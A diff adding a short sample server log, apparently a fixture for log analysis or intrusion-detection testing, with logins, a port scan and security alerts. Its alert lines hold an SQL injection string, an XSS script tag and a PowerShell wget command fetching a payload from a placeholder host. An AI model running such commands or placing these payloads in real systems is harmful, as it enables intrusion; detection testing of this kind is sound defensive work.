@@ -1,0 +1,12 @@
+2026-08-12 09:00:01 INFO User admin logged in successfully from 192.168.1.5
+2026-08-12 09:01:15 WARN Failed login for user admin from 192.168.1.10
+2026-08-12 09:01:20 WARN Failed login for user admin from 192.168.1.10
+2026-08-12 09:01:25 WARN Failed login for user admin from 192.168.1.10
+2026-08-12 09:03:11 ERROR Unauthorized access detected on /admin
+2026-08-12 09:04:08 INFO GET /index.html 200
+2026-08-12 09:05:33 ALERT SQL Injection attempt: ' OR 1=1 --
+2026-08-12 09:06:42 ALERT <script>alert('XSS')</script>
+2026-08-12 09:07:10 INFO Server health check completed
+2026-08-12 09:10:00 WARN Nmap port scan detected from 10.0.0.22
+2026-08-12 09:11:30 ALERT powershell -Command wget http://example.test/payload
+2026-08-12 09:12:00 INFO Backup completed successfully
